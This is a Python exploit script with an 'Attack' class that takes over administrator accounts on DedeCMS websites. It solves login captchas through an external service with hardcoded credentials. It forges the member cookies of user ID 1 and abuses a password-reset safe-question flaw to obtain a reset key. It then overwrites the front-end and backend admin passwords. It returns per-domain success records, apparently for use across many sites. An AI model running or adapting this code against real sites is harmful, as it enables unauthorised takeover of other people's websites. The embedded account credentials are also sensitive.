# -*- coding: utf-8 -*-
from common import utils
import requests
import traceback
import re
from PIL import Image
import time


class Attack:
    def __init__(self, domain, back_ground_url, user, pwd):
        self.domain = domain
        self.back_ground_url = back_ground_url
        self.user = user
        self.pwd = pwd
        self.session = requests.session()
        self.heders = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"}
        # self._login_member()
        self.vcode_url = "/include/vdimgck.php"
        self.charset = "utf-8"

    def _login_member(self, try_count=3):
        try:
            login_url = "%s/member" % self.domain
            login_form = {"dopost": "login",
                          "fmdo": "login",
                          "userid": self.user,
                          "pwd": self.pwd,
                          "vdcode": "",
                          "gourl": "/",
                          "keeptime": "604800"}
            res = utils.my_requests(login_url, timeout=60, requester=self.session)
            try:
                self.charset = re.findall('(?<=charset\=).*(?=")', res.text)[0]
                if self.charset != "utf-8":
                    self.charset = "gbk"
            except Exception as e:
                print("%s:编码识别错误" % self.domain)
            # if "vdimgck" in re.sub("(?=<!--)[\s\S]+(?<=-->)","",res.text):
            if 1 == 1:
                res = utils.my_requests(self.domain + self.vcode_url, timeout=10, requester=self.session)
                img_path = "./vcode/%d.jpg" % int(time.time())
                with open(file=img_path, mode="wb") as fp:
                    fp.write(res.content)
                img = Image.open(img_path)
                vcode_v = utils.base64_api(uname='danche', pwd='qq199605', img=img)
                login_form.update({"vdcode": vcode_v})
            res = utils.my_requests(method="post", url=login_url + "/index_do.php", headers=self.heders,
                                    data=login_form, allow_redirects=True, timeout=120, requester=self.session)
            if "DedeUserID" in requests.utils.dict_from_cookiejar(self.session.cookies).keys():
                return True
            else:
                res = utils.my_requests(method="post", url=login_url + "/index_do.php", headers=self.heders,
                                        params=login_form,
                                        allow_redirects=True, timeout=120, requester=self.session)
                if "DedeUserID" in requests.utils.dict_from_cookiejar(self.session.cookies).keys():
                    return True
            if try_count - 1 > 0:
                return self._login_member(try_count - 1)
        except Exception as e:
            traceback.print_exc()
            if try_count - 1 > 0:
                return self._login_member(try_count - 1)
            else:
                return False

    def get_admin_cookie(self):
        res = self._login_member()
        if not res:
            return {"domain": self.domain, "res": False, "info": "会员页登录失败"}
        try:
            res = utils.my_requests(method="get", url="%s/member/index.php?uid=0000001" % self.domain,
                                    requester=self.session)
            cookie = requests.utils.dict_from_cookiejar(self.session.cookies)
            # if "last_vid__ckMd5" not in cookie.keys():
            #     return {"domain": self.domain, "res": False, "info": "空间未开放"}
            cookie.update({"DedeUserID": "0000001", "DedeUserID__ckMd5": cookie["last_vid__ckMd5"]})
            return {"domain": self.domain, "res": True, "info": cookie}
        except Exception as e:
            return {"domain": self.domain, "res": False, "info": "获取前台cookie失败(空间未开放)"}

    def _login_admin(self, try_count=3):
        # global hash_v, hash_k, rhash_k, rhash_v
        try:
            login_url = "%s/login.php" % self.back_ground_url
            login_form = {"dopost": "login",
                          "adminstyle": "newdedecms",
                          "userid": self.user,
                          "pwd": self.pwd}
            utils.my_requests(login_url, timeout=60, requester=self.session)
            utils.my_requests(method="post", url=login_url, data=login_form, allow_redirects=True, timeout=120,
                              requester=self.session)
            return True
        except Exception as e:
            traceback.print_exc()
            if try_count - 1 > 0:
                return self._login_admin(try_count - 1)
            else:
                return False

    def reset_back_admin(self, try_count=3):
        try:
            res = utils.my_requests(method="get", url=self.domain + "/member/edit_baseinfo.php", requester=self.session)
            try:
                uname = re.findall(r'(?<=id\="uname" value\=").*?(?=")', res.text)[0]
            except Exception as e:
                uname = "admin"
            post_form = {"dopost": "save",
                         "uname": uname,
                         "oldpwd": self.pwd,
                         "userpwd": self.pwd,
                         "userpwdok": self.pwd,
                         "safequestion": "0",
                         "safeanswer": "",
                         "newsafequestion": "0",
                         "newsafeanswer": "",
                         "sex": "男".encode(self.charset),
                         "email": "1999929291992@qq.com",
                         "vdcode": ""}
            res = utils.my_requests(self.domain + self.vcode_url, timeout=10, requester=self.session)
            img_path = "./vcode/%d.jpg" % int(time.time())
            with open(file=img_path, mode="wb") as fp:
                fp.write(res.content)
            img = Image.open(img_path)
            vcode_v = utils.base64_api(uname='danche', pwd='qq199605', img=img)
            post_form.update({"vdcode": vcode_v})
            res = utils.my_requests(method="post", url=self.domain + "/member/edit_baseinfo.php", headers=self.heders,
                                    data=post_form,
                                    allow_redirects=True, timeout=120, requester=self.session)
            if "成功" not in res.text:
                res = utils.my_requests(method="post", url=self.domain + "/member/edit_baseinfo.php",
                                        headers=self.heders, params=post_form,
                                        allow_redirects=True, timeout=120, requester=self.session)
                if "成功" not in res.text:
                    if try_count - 1 >= 0:
                        return self.reset_back_admin(try_count - 1)
                    else:
                        if "完成详细资料" in res.text:
                            return {"domain": self.domain, "res": False, "info": "失败（完善详细资料）！！！"}
                        return {"domain": self.domain, "res": False, "info": "失败！！！"}
            return {"domain": "%s|%s|admin(%s)" % (self.domain, self.back_ground_url, uname), "res": True,
                    "info": "成功！！！"}
        except Exception as e:
            traceback.print_exc()
            if try_count - 1 >= 0:
                return self.reset_back_admin(try_count - 1)
            else:
                return {"domain": self.domain, "res": False, "info": "失败！！！"}

    def start(self):
        res = self.get_admin_cookie()
        if not res["res"]:
            return res
        params = {"dopost": "safequestion", "safequestion": "0.0", "safeanswer": "", "id": 1}
        cookie_str = str(res["info"]).replace("'", "").replace("{", "").replace("}", "").replace(": ", "=").replace(
            ", ", "; ")
        headers = {"Cookie": cookie_str}
        try:
            reset_pwd_url = "%s/member/resetpassword.php" % self.domain
            res = requests.post(url=reset_pwd_url, params=params, headers=headers)
            pwd_url = re.findall("(?<=href=').*(?='>)", res.text)[0].replace('amp;', "")
            # pwd_url = re.sub("(http://).*(?=http)", "", pwd_url)
            # res = self.session.get(pwd_url)
            key = re.findall("(?<=key=).*", pwd_url)[0]
            login_form = {"dopost": "getpasswd",
                          "userid": "admin",
                          "setp": "2",
                          "id": "1",
                          "pwd": self.pwd,
                          "pwdok": self.pwd,
                          "key": key}
            res = utils.my_requests(method="post", url=reset_pwd_url, data=login_form, allow_redirects=True,
                                    timeout=120, requester=self.session)
            if "密码成功" not in res.text:
                res = utils.my_requests(method="post", url=reset_pwd_url, params=login_form, allow_redirects=True,
                                        timeout=120, requester=self.session)
                if "密码成功" not in res.text:
                    return {"domain": self.domain, "res": False, "info": "更新前台admin密码失败"}
        except Exception as e:
            traceback.print_exc()
            return {"domain": self.domain, "res": False, "info": "更新前台admin密码失败"}
        try:
            # self.user = "admin"
            # self.session = requests.session()
            res = self.get_admin_cookie()
            self.session = requests.session()
            for k, v in res["info"].items():
                self.session.cookies[k] = v
            if not res:
                print("第二次获取admin cookie失败，异常")
                return res
        except:
            if not res:
                return {"domain": self.domain, "res": False, "info": "更新后台admin密码失败"}
        res = self.reset_back_admin()
        return res
